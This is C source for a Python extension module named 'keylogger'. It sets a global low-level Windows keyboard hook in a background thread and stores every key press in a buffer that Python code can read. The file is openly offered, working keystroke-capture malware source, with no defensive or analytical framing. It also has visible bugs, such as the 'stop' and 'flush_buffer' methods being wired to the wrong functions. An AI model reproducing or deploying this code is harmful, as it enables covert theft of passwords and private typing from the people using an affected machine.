#define PY_SSIZE_T_CLEAN
#include <Python.h>
#include <windows.h>
#include <winuser.h>

#pragma comment(lib, "User32.lib")

#define KEY_BUFFER_SIZE 1024

typedef struct KeyBuffer {
    int key_head;
    int key_tail;
    int keybuffer[KEY_BUFFER_SIZE];
} KeyBuffer;

typedef struct Keylogger {
    PyObject_HEAD 
    KeyBuffer* buffer;
} Keylogger;

/* Global variables*/
static KeyBuffer* g_buff = NULL;
static CRITICAL_SECTION g_buff_lock;
static HANDLE* g_keylogger_handle;

static int pop_key(KeyBuffer* buffer) {
    int key = -1;
    EnterCriticalSection(&g_buff_lock);
    if (buffer->key_head != buffer->key_tail) {
        key = buffer->keybuffer[buffer->key_tail];
        buffer->key_tail = (buffer->key_tail + 1) % KEY_BUFFER_SIZE;
    }
    LeaveCriticalSection(&g_buff_lock);
    return key;
}

static int* get_buffer_copy(KeyBuffer* buffer, int* out_len) {
    int* copy = NULL;
    EnterCriticalSection(&g_buff_lock);

    int head = buffer->key_head;
    int tail = buffer->key_tail;
    int len = (head - tail + KEY_BUFFER_SIZE) % KEY_BUFFER_SIZE;

    if (len > 0) {
        copy = (int*)malloc(sizeof(int) * len);
        if (!copy) {
            LeaveCriticalSection(&g_buff_lock);
            *out_len = 0;
            return NULL;
        }

        if (tail < head) {
            memcpy(copy, &buffer->keybuffer[tail], sizeof(int) * len);
        } else {
            int first_part = KEY_BUFFER_SIZE - tail;
            memcpy(copy, &buffer->keybuffer[tail], sizeof(int) * first_part);
            memcpy(copy + first_part, &buffer->keybuffer[0], sizeof(int) * (len - first_part));
        }
    }

    LeaveCriticalSection(&g_buff_lock);
    *out_len = len;
    return copy;
}

static int push_key(KeyBuffer* buffer, int key) {
    int next_pos = (buffer->key_head + 1) % KEY_BUFFER_SIZE;
    EnterCriticalSection(&g_buff_lock);
    if (next_pos != buffer->key_tail) {
        buffer->keybuffer[buffer->key_head] = key;
        buffer->key_head = next_pos;
        LeaveCriticalSection(&g_buff_lock);
        return 0;
    }
    LeaveCriticalSection(&g_buff_lock);
    return -1;
}

static int flush_buffer(KeyBuffer* buffer) {
    int count = 0;
    EnterCriticalSection(&g_buff_lock);

    if (buffer->key_head >= buffer->key_tail) {
        count = buffer->key_head - buffer->key_tail;
    } else {
        count = (KEY_BUFFER_SIZE - buffer->key_tail) + buffer->key_head;
    }

    memset(buffer->keybuffer, 0, sizeof(buffer->keybuffer));

    buffer->key_head = 0;
    buffer->key_tail = 0;

    LeaveCriticalSection(&g_buff_lock);
    return count;
}

static LRESULT CALLBACK Keylogger_HookProc(int code, WPARAM wParam, LPARAM lParam) {
    if (code == HC_ACTION) {
        KBDLLHOOKSTRUCT* keyboard = (KBDLLHOOKSTRUCT*)lParam;

        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            assert(g_buff != NULL); /* Never happens because py __init__ always alloc memory*/
            push_key(g_buff, keyboard->vkCode);
        }
    }

    return CallNextHookEx(NULL, code, wParam, lParam);
}

static DWORD WINAPI Keylogger_Run() {
    HHOOK keyhook;
    HINSTANCE exe = GetModuleHandle(NULL);

    if (!exe) {
        return 1;
    }

    keyhook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)Keylogger_HookProc, exe, 0);

    MSG key_msg;
    while (GetMessage(&key_msg, NULL, 0, 0) != 0) {
        TranslateMessage(&key_msg);
        DispatchMessage(&key_msg);
    }
    UnhookWindowsHookEx(keyhook);

    return 0;
}

static HANDLE Keylogger_Thread() {
    HANDLE hthread = CreateThread(
        NULL, 0, (LPTHREAD_START_ROUTINE)Keylogger_Run, NULL, 0,
    NULL);
    return hthread;
}

static int Keylogger_init(Keylogger* self, PyObject* args, PyObject* kwds) {
    self->buffer = (KeyBuffer*)malloc(sizeof(KeyBuffer));

    if(!self->buffer) {
        PyErr_NoMemory();
        return -1;
    }

    self->buffer->key_head = 0;
    self->buffer->key_tail = 0;
    g_buff = self->buffer;

    InitializeCriticalSection(&g_buff_lock);

    return 0;
}

static void Keylogger_dealloc(Keylogger* self) {
    DeleteCriticalSection(&g_buff_lock);
    if (self->buffer) {
        free(self->buffer);
        self->buffer = NULL;
    }
    Py_TYPE(self)->tp_free((PyObject *) self);
}

static PyObject* Keylogger_start(Keylogger* self, PyObject* Py_UNUSED(ignore)) {
    g_keylogger_handle = Keylogger_Thread();
    Py_RETURN_NONE;
}

static PyObject* Keylogger_stop(Keylogger* self, PyObject* Py_UNUSED(ignore)) {
    if (!g_keylogger_handle) {
        PyErr_SetString(PyExc_RuntimeError, "You must initialize first");
        return NULL;
    }

    if (UnhookWindowsHookEx(g_keylogger_handle) == 0) {
        PyErr_SetFromWindowsErr(0);
        return NULL;
    }

    g_keylogger_handle = NULL;
    Py_RETURN_NONE;
}

static PyObject* Keylogger_get_buffer(Keylogger* self, PyObject* Py_UNUSED(ignore)) {
    KeyBuffer* buff = self->buffer;
    int len = 0;
    int* copy = get_buffer_copy(buff, &len);

    if (!copy) {
        return PyErr_NoMemory();
    }

    PyObject* tuple = PyTuple_New(len);
    if (!tuple) {
        free(copy);
        return PyErr_NoMemory();
    }

    for (int i = 0; i < len; i++) {
        PyObject* val = PyLong_FromLong(copy[i]);
        if (!val) {
            Py_DECREF(tuple);
            free(copy);
            return PyErr_NoMemory();
        }
        PyTuple_SET_ITEM(tuple, i, val);
    }

    free(copy);
    return tuple;
}

static PyObject* Keylogger_flush_buffer(Keylogger* self, PyObject* Py_UNUSED(ignore)) {
    PyObject* buffer = Keylogger_get_buffer(self, NULL);
    if (!buffer) {
        return NULL;
    }
    flush_buffer(self->buffer);
    return buffer;
}

static PyMethodDef Keylogger_methods[] = {
    {"start", (PyCFunction) Keylogger_start, METH_NOARGS, "Start the keylogger in another thread"},
    {"stop", (PyCFunction) Keylogger_start, METH_NOARGS, "Remove low level keylogger hook"},
    {"get_buffer", (PyCFunction) Keylogger_get_buffer, METH_NOARGS, "Return internal buffer list"},
    {"flush_buffer", (PyCFunction) Keylogger_get_buffer, METH_NOARGS, "Flush and return internal buffer list"},
    {NULL, NULL, 0, NULL}
};

static PyTypeObject KeyloggerType = {
    PyVarObject_HEAD_INIT(NULL, 0)
    .tp_name = "keylogger.Keylogger",
    .tp_basicsize = sizeof(Keylogger),
    .tp_flags = Py_TPFLAGS_DEFAULT | Py_TPFLAGS_BASETYPE,
    .tp_doc = "Keylogger object",
    .tp_methods = Keylogger_methods,
    .tp_init = (initproc) Keylogger_init,
    .tp_new = PyType_GenericNew,
    .tp_dealloc = (destructor) Keylogger_dealloc
};

static PyModuleDef keyloggermodule = {
    PyModuleDef_HEAD_INIT,
    .m_name = "keylogger",
    .m_doc = "Low level keylogger",
    .m_size = -1,
};

PyMODINIT_FUNC
PyInit_keylogger(void) {
    PyObject* m;
    if (PyType_Ready(&KeyloggerType) < 0)
        return NULL;

    m = PyModule_Create(&keyloggermodule);
    if (!m)
        return NULL;

    Py_INCREF(&KeyloggerType);
    PyModule_AddObject(m, "Keylogger", (PyObject*)&KeyloggerType);
    return m;
}

#ifdef MAIN_TEST
int main() {
    return 0;
}
#endif